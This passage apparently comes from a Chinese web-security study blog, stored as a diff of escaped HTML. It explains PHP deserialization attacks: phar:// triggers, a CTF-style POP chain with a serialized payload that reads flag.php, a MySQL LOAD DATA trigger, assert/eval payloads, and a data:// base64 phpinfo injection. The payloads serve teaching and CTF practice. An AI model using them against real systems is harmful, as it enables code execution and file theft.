+&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433050.png&#34; alt=&#34;image-20200803171100075&#34;&gt;&lt;/p&gt;
+&lt;p&gt;生成的phar文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433318.png&#34; alt=&#34;image-20200803161934014&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;使用条件&lt;/strong&gt;：&lt;/p&gt;
+&lt;p&gt;(1)文件上传点&lt;br&gt;(2)系统文件函数&lt;br&gt;(3) phar:// 伪协议&lt;/p&gt;
+&lt;figure class=&#34;highlight kotlin&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs kotlin&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;TestObject&lt;/span&gt;{&lt;br&gt;		function __destruct(){&lt;br&gt;			echo $&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;data&lt;/span&gt;;&lt;br&gt;		}&lt;br&gt;	}&lt;br&gt;&lt;br&gt;	unlink(&lt;span class=&#34;hljs-string&#34;&gt;&#34;phar://phar.phar/test.txt&#34;&lt;/span&gt;);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;当执行如上函数时，phar文件中的payload即可被执行&lt;/p&gt;
+&lt;h2 id=&#34;构造POP链&#34;&gt;&lt;a href=&#34;#构造POP链&#34; class=&#34;headerlink&#34; title=&#34;构造POP链&#34;&gt;&lt;/a&gt;构造POP链&lt;/h2&gt;&lt;hr&gt;
+&lt;p&gt;例题：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;Welcome to index.php&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Modifier&lt;/span&gt; &lt;/span&gt;{&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt;  &lt;span class=&#34;hljs-variable&#34;&gt;$var&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;append&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;{&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;);&lt;br&gt;    }&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__invoke&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;{&lt;br&gt;        &lt;span class=&#34;hljs-variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;append&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt;);&lt;br&gt;    }&lt;br&gt;}&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Show&lt;/span&gt;&lt;/span&gt;{&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$source&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&#39;index.php&#39;&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;{&lt;br&gt;        &lt;span class=&#34;hljs-variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;source = &lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&#39;Welcome to &#39;&lt;/span&gt;.&lt;span class=&#34;hljs-variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;source.&lt;span class=&#34;hljs-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;;&lt;br&gt;    }&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__toString&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;{&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;str-&amp;gt;source;&lt;br&gt;    }&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__wakeup&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;{&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$this&lt;/span&gt;-&amp;gt;source)) {&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&#34;hacker&#34;&lt;/span&gt;;&lt;br&gt;            &lt;span class=&#34;hljs-variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;source = &lt;span class=&#34;hljs-string&#34;&gt;&#34;index.php&#34;&lt;/span&gt;;&lt;br&gt;        }&lt;br&gt;    }&lt;br&gt;}&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Test&lt;/span&gt;&lt;/span&gt;{&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;{&lt;br&gt;        &lt;span class=&#34;hljs-variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;p = &lt;span class=&#34;hljs-keyword&#34;&gt;array&lt;/span&gt;();&lt;br&gt;    }&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__get&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;{&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt; = &lt;span class=&#34;hljs-variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;p;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt;();&lt;br&gt;    }&lt;br&gt;}&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&#39;pop&#39;&lt;/span&gt;])){&lt;br&gt;    @&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&#39;pop&#39;&lt;/span&gt;]);&lt;br&gt;}&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;{&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;=&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;Show&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;}&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;p&gt;Payload&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;O:&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;Show&#34;&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:{s:&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;source&#34;&lt;/span&gt;;O:&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;Show&#34;&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:{s:&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;source&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;aaa&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;str&#34;&lt;/span&gt;;O:&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;Test&#34;&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:{s:&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;p&#34;&lt;/span&gt;;O:&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;Modifier&#34;&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:{s:&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;%00*%00var&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;52&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;php://filter/convert.base64-encode/resource=flag.php&#34;&lt;/span&gt;;}}}s:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;str&#34;&lt;/span&gt;;N;}&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+
+
+&lt;h2 id=&#34;MySQL触发反序列化&#34;&gt;&lt;a href=&#34;#MySQL触发反序列化&#34; class=&#34;headerlink&#34; title=&#34;MySQL触发反序列化&#34;&gt;&lt;/a&gt;MySQL触发反序列化&lt;/h2&gt;&lt;hr&gt;
+&lt;p&gt;php调用mysql的语句  &lt;strong&gt;LOAD DATA LOCAL INFILE&lt;/strong&gt; 导入phar文件也能触发phar中的反序列化&lt;/p&gt;
+&lt;p&gt;需要my.ini进行如下配置&lt;/p&gt;
+&lt;figure class=&#34;highlight ini&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ini&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;local-infile&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;secure_file_priv&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;LOAD&lt;/span&gt; DATA &lt;span class=&#34;hljs-keyword&#34;&gt;LOCAL&lt;/span&gt; INFILE &lt;span class=&#34;hljs-string&#34;&gt;&#39;phar://phar.phar/test.txt&#39;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;user&lt;/span&gt;;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&#34;&gt;https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&lt;/a&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;?data=O:&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;HelloPhp&#34;&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:{s:&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;a&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;phpinfo()&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;b&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;assert&#34;&lt;/span&gt;;}&lt;br&gt;?data=O:&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;HelloPhp&#34;&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:{s:&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;a&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;phpinfo()&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;b&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;assert&#34;&lt;/span&gt;;}&lt;br&gt;?data=O:&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;HelloPhp&#34;&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:{s:&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;a&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;phpinfo()&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;b&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;eval&#34;&lt;/span&gt;;}&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/7570&#34;&gt;https://xz.aliyun.com/t/7570&lt;/a&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;原理：某些对象在序列化后会因为用户的输入而产生影响，即黑客的数据会被插入到黑客的字节数据中导致该字节序列在服务器端进行反序列化后的对象发生变化。&lt;ol&gt;
+&lt;li&gt;魔术方法：&lt;ol&gt;
+&lt;li&gt;构造函数__construct()：当创建对象时会自动进行调用&lt;/li&gt;
+&lt;li&gt;析构函数__deconstruct()：当对象被销毁时会自动调用&lt;/li&gt;
+&lt;li&gt;__wakeup()：当调用unserialize()函数时会自动调用&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;触发函数：serialize和unserialize函数进行触发&lt;/li&gt;
+&lt;li&gt;防御方式：不要将用户的输入或者用户可控的参数直接插入到反序列化操作中去，采用白名单限制&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;JAVA中的反序列化&#34;&gt;&lt;a href=&#34;#JAVA中的反序列化&#34; class=&#34;headerlink&#34; title=&#34;JAVA中的反序列化&#34;&gt;&lt;/a&gt;JAVA中的反序列化&lt;/h2&gt;&lt;hr&gt;
+&lt;p&gt;下面不属于OWASP top 10中的内容，但为方便查询也在此记录。&lt;/p&gt;
+&lt;h1 id=&#34;PHP伪协议&#34;&gt;&lt;a href=&#34;#PHP伪协议&#34; class=&#34;headerlink&#34; title=&#34;PHP伪协议&#34;&gt;&lt;/a&gt;PHP伪协议&lt;/h1&gt;&lt;h2 id=&#34;一、漏洞依附&#34;&gt;&lt;a href=&#34;#一、漏洞依附&#34; class=&#34;headerlink&#34; title=&#34;一、漏洞依附&#34;&gt;&lt;/a&gt;一、漏洞依附&lt;/h2&gt;&lt;p&gt;\1. allow_url_fopen()打开文件-&amp;gt;通常设置为On，使得可以访问 URL 对象文件等。&lt;/p&gt;
+&lt;p&gt;\2. allow_url_include()引用文件-&amp;gt;通常设置为off，包含URL 对象文件等&lt;/p&gt;
+&lt;p&gt;均可在配置文件，php.ini中查看（通常位置：/usr/local/php/lib）&lt;/p&gt;
+&lt;h2 id=&#34;二、常见协议&#34;&gt;&lt;a href=&#34;#二、常见协议&#34; class=&#34;headerlink&#34; title=&#34;二、常见协议&#34;&gt;&lt;/a&gt;二、常见协议&lt;/h2&gt;&lt;h3 id=&#34;1-data&#34;&gt;&lt;a href=&#34;#1-data&#34; class=&#34;headerlink&#34; title=&#34;1. data:&#34;&gt;&lt;/a&gt;1. data:&lt;/h3&gt;&lt;p&gt;访问本地文件系统 &lt;/p&gt;
+&lt;p&gt;实例：&lt;strong&gt;1.?file=data:text/plain,  #GET数据&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;此时对输入执行file_get_contents&lt;/p&gt;
+&lt;p&gt;data://text/plain,I%20have%20a%20dream  # z直接读取plain后的内容&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2.?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=  #后面的base64字符是需要传入的字符串的base64编码&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;2-phar&#34;&gt;&lt;a href=&#34;#2-phar&#34; class=&#34;headerlink&#34; title=&#34;2. phar:&#34;&gt;&lt;/a&gt;2. phar:&lt;/h3&gt;&lt;p&gt;可以查找指定压缩包内的文件，说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关。&lt;/p&gt;
+&lt;p&gt;实例：**filename=**&lt;strong&gt;phar://test.[zip/jpg/png…]/file.txt&lt;/strong&gt;  phar://test.rar/1.txt&lt;/p&gt;
